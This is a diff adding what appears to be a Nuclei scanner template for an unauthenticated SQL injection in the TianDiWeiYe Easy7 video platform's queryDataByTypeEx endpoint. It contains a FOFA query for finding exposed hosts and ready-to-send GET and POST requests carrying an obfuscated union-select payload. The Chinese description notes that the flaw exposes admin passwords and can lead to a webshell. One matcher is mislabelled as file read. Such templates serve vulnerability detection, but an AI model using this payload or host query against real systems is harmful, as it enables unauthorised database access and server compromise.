@@ -1,0 +1,43 @@
+id: TianDiWeiYe-Easy7-queryDataByTypeEx-SQL
+
+info:
+  name: 天地伟业Easy7 /Easy7/rest/workbook/queryDataByTypeEx SQL注入
+  author: HuanXiong
+  severity: high
+  description: |
+    fofa: body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7_logo_transparent.png") && title="平台"
+    天地伟业Easy7 /Easy7/rest/workbook/queryDataByTypeEx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference:
+    - 
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |-
+        GET /Easy7/rest/workbook/queryDataByTypeEx?tabname=/*!TAB_WORKBOOK_TYPE*/where/**/1=1/**/union/**/select/**/user(),1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        
+    matchers:
+      - type: dsl
+        name: SQL注入-GET接口
+        dsl:
+          - "status_code==200 && contains_all(body,'easy7@','content','id','caption')"
+        condition: and
+  - raw:
+      - |-
+        POST /Easy7/rest/workbook/queryDataByTypeEx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/[REDACTED] Safari/537.36
+
+        tabname=/*!TAB_WORKBOOK_TYPE*/where/**/1=1/**/union/**/select/**/user(),1
+
+    matchers:
+      - type: dsl
+        name: 任意文件读取-POST接口
+        dsl:
+          - "status_code==200 && contains_all(body,'easy7@','content','id','caption')"
+        condition: and
